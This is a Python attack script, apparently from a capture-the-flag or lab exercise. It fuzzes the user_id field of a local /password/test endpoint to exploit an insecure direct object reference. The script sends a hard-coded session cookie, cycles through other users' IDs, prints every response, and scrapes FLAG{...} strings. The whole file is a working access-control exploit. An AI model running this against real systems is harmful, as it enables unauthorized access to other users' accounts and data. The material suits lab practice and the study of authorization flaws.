import requests
import re

# Configuration
base_url = "http://127.0.0.1"
endpoint = "/password/test"
session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVLZTQ.z651MIIGwyc5j22vEEhWG05KGeo"

# Setup session
session = requests.Session()
session.cookies.set('session', session_cookie)

# Test range
test_values = range(10030, 10041)

print(f"[*] Starting IDOR fuzzing test on {endpoint}")
print(f"[*] Testing user_id values from 10030 to 10040")

found_flags = []
anomalies = []

for user_id in test_values:
    print(f"\n[TEST] user_id={user_id}")
    
    payload = {
        'username': 'test',
        'user_id': str(user_id),
        'password': 'test'
    }
    
    try:
        response = session.post(
            f"{base_url}{endpoint}",
            data=payload,
            allow_redirects=False,
            timeout=10
        )
        
        print(f"[RESPONSE] Status: {response.status_code}")
        print(f"[RESPONSE] Length: {len(response.content)}B")
        
        if response.status_code in [301, 302, 303, 307, 308]:
            print(f"[REDIRECT] Location: {response.headers.get('Location', 'N/A')}")
        
        if response.cookies:
            print(f"[COOKIES] {dict(response.cookies)}")
        
        # Print full response content
        print(f"[CONTENT] {response.text}")
        
        # Search for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flag_matches:
            for flag in flag_matches:
                print(f"[FLAG] {flag}")
                found_flags.append((user_id, flag))
        
        # Track anomalies
        if response.status_code != 404:
            anomalies.append({
                'user_id': user_id,
                'status': response.status_code,
                'length': len(response.content)
            })
            
    except Exception as e:
        print(f"[ERROR] user_id={user_id}: {e}")

print(f"\n[*] Test completed. Tested {len(test_values)} values.")
print(f"[*] Found {len(found_flags)} flags.")
print(f"[*] Found {len(anomalies)} anomalies.")

if found_flags:
    print("\n[!] FLAGS FOUND:")
    for user_id, flag in found_flags:
        print(f"  user_id {user_id}: {flag}")

if anomalies:
    print("\n[!] ANOMALIES:")
    for anomaly in anomalies:
        print(f"  user_id {anomaly['user_id']}: Status {anomaly['status']}, Length {anomaly['length']}B")

